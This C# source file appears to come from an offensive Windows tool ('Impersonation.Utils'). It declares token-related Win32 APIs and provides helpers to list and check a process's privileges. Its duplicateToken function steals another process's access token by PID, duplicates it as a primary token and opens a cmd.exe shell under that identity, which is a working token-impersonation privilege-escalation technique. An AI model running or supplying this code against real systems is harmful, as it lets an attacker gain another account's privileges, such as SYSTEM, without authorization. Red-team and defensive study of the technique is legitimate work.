using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Impersonation.Utils
{
    class Privs
    {

		private const int ANYSIZE_ARRAY = 1;
		public static uint SE_PRIVILEGE_ENABLED = 0x00000002;
		public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
		public static uint STANDARD_RIGHTS_READ = 0x00020000;
		public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;
		public static uint TOKEN_DUPLICATE = 0x00000002;
		public static uint TOKEN_IMPERSONATE = 0x00000004;
		public static uint TOKEN_QUERY = 0x00000008;
		public static uint TOKEN_QUERY_SOURCE = 0x00000010;
		public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
		public static uint TOKEN_ADJUST_GROUPS = 0x00000040;
		public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;
		public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;
		public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;
		public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;

		[StructLayout(LayoutKind.Sequential)]
		public struct LUID
		{
			public uint LowPart;
			public uint HighPart;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct PRIVILEGE_SET
		{
			public uint PrivilegeCount;
			public uint Control;

			public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
			public LUID_AND_ATTRIBUTES[] Privilege;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct LUID_AND_ATTRIBUTES
		{
			public LUID Luid;
			public UInt32 Attributes;

			public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
			public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
			public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;
			public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;
		}


		enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
	    TokenHasRestrictions,
	    TokenAccessInformation,
	    TokenVirtualizationAllowed,
	    TokenVirtualizationEnabled,
	    TokenIntegrityLevel,
	    TokenUIAccess,
	    TokenMandatoryPolicy,
	    TokenLogonSid,
	    MaxTokenInfoClass
        }

        [DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool PrivilegeCheck(
		IntPtr ClientToken,
		ref PRIVILEGE_SET RequiredPrivileges,
		out bool pfResult
		);

		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

		[DllImport("advapi32.dll")]
		static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		[return: MarshalAs(UnmanagedType.Bool)]
		protected static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName);


		[DllImport("kernel32.dll")]
		static extern uint GetLastError();

		[DllImport("advapi32.dll", SetLastError = true)]
		static extern bool GetTokenInformation(
		IntPtr TokenHandle,
		TOKEN_INFORMATION_CLASS TokenInformationClass,
		IntPtr TokenInformation,
		int TokenInformationLength,
		out int ReturnLength);

		[StructLayout(LayoutKind.Sequential)]
		public struct TOKEN_PRIVILEGES
		{
			public int PrivilegeCount;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
			public LUID_AND_ATTRIBUTES[] Privileges;
		}

		[Flags]
		public enum ProcessAccessFlags : uint
		{
			All = 0x001F0FFF,
			Terminate = 0x00000001,
			CreateThread = 0x00000002,
			VirtualMemoryOperation = 0x00000008,
			VirtualMemoryRead = 0x00000010,
			VirtualMemoryWrite = 0x00000020,
			DuplicateHandle = 0x00000040,
			CreateProcess = 0x000000080,
			SetQuota = 0x00000100,
			SetInformation = 0x00000200,
			QueryInformation = 0x00000400,
			QueryLimitedInformation = 0x00001000,
			Synchronize = 0x00100000
		}

		[DllImport("advapi32.dll")]
		public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(
		 ProcessAccessFlags processAccess,
		 bool bInheritHandle,
		 int processId);

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			public Int32 cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public Int32 dwX;
			public Int32 dwY;
			public Int32 dwXSize;
			public Int32 dwYSize;
			public Int32 dwXCountChars;
			public Int32 dwYCountChars;
			public Int32 dwFillAttribute;
			public Int32 dwFlags;
			public Int16 wShowWindow;
			public Int16 cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct SECURITY_ATTRIBUTES
		{
			public int nLength;
			public IntPtr lpSecurityDescriptor;
			public int bInheritHandle;
		}

		public enum TOKEN_TYPE
		{
			TokenPrimary = 1,
			TokenImpersonation
		}

		public enum SECURITY_IMPERSONATION_LEVEL
		{
			SecurityAnonymous,
			SecurityIdentification,
			SecurityImpersonation,
			SecurityDelegation
		}


		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public extern static bool DuplicateTokenEx(
		IntPtr hExistingToken,
		uint dwDesiredAccess,
		IntPtr lpTokenAttributes,
		SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
		TOKEN_TYPE TokenType,
		out IntPtr phNewToken);

		[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
		public static extern bool CreateProcessWithTokenW(
		IntPtr hToken,
		UInt32 dwLogonFlags,
		string lpApplicationName,
		string lpCommandLine,
		UInt32 dwCreationFlags,
		IntPtr lpEnvironment,
		string lpCurrentDirectory,
		[In] ref STARTUPINFO lpStartupInfo,
		out PROCESS_INFORMATION lpProcessInformation);

		public static bool duplicateToken(int pid)
        {
			STARTUPINFO si = new STARTUPINFO();
			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

			IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);
			if (hProcess == IntPtr.Zero)
			{
				throw new Exception(String.Format("Handle cannot be obtained from {0}", pid));
			}
			IntPtr hToken;
			if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken))
			{
				throw new Exception(String.Format("Token cannot be obtained from {0}", pid));
			}

			IntPtr DuplicatedToken;

			if (!DuplicateTokenEx(hToken, 
				TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, 
				IntPtr.Zero,
				SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out DuplicatedToken))
            {
				throw new Exception(String.Format("Token from <{0}> cannot be duplicated", pid));
            }

			if (!CreateProcessWithTokenW(DuplicatedToken, 0x00000002, "c:\\windows\\system32\\cmd.exe", null, 0x00000010, IntPtr.Zero, null, ref si, out pi))
			{
				throw new Exception(String.Format("New process cannot be spawned. Error Code: {0}", GetLastError()));
			}
			return true;
		}

		public static List<string> getPrivs(int pid)
        {
			List<string> allPrivs = new List<string>();

			bool ret;
			IntPtr token;
			ret = OpenProcessToken(Process.GetProcessById(pid).Handle, TOKEN_QUERY, out token);
			Int32 TokenLength;
			ret = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, out TokenLength);
			IntPtr TokenInfo = Marshal.AllocHGlobal(TokenLength);
			ret = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInfo, TokenLength, out TokenLength);
			TOKEN_PRIVILEGES privs = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(TokenInfo, typeof(TOKEN_PRIVILEGES));

			IntPtr startingPtr = new IntPtr(TokenInfo.ToInt64() + sizeof(uint));
			for (int i = 0; i < privs.PrivilegeCount; i++)
            {
				int size = Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES));
				IntPtr tempPtr = new IntPtr(startingPtr.ToInt64() + i * size);
				LUID_AND_ATTRIBUTES laa = (LUID_AND_ATTRIBUTES)Marshal.PtrToStructure(tempPtr, typeof(LUID_AND_ATTRIBUTES));
				int cchName = 100;
				System.Text.StringBuilder name = new System.Text.StringBuilder(100);
				IntPtr luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(laa.Luid));
				Marshal.StructureToPtr(laa.Luid, luidPtr, true);
				LookupPrivilegeName(null, luidPtr, name, ref cchName);
				allPrivs.Add(name.ToString());
				Marshal.FreeHGlobal(luidPtr);
            }
			Marshal.FreeHGlobal(TokenInfo);
			return allPrivs;
		}

		public static bool checkPriv(string privilege, int pid)
        {
			bool res;
			LUID luid = new LUID();
			IntPtr hProcess;
			IntPtr hToken;

			hProcess = Process.GetProcessById(pid).Handle;
			if (hProcess == IntPtr.Zero)
            {
				throw new Exception(String.Format("Error obtain process handle. PID: {0}. Error Code: {1}", pid, GetLastError()));
            }
			if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken))
            {
                throw new Exception(String.Format("Reading process privileges. Error Code: {0}", GetLastError()));
            }

			if (!LookupPrivilegeValue(null, privilege, out luid))
            {
				throw new Exception(String.Format("Privilege Lookup. Error Code: {0}", GetLastError()));
            }

			PRIVILEGE_SET privs = new PRIVILEGE_SET();
			privs.PrivilegeCount = 1;
			privs.Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY;
			privs.Privilege = new LUID_AND_ATTRIBUTES[1];
			privs.Privilege[0].Luid = luid;
			privs.Privilege[0].Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;

			if (!PrivilegeCheck(hToken, ref privs, out res))
			{
				return false;
			}

			return res;
		}


	}
}
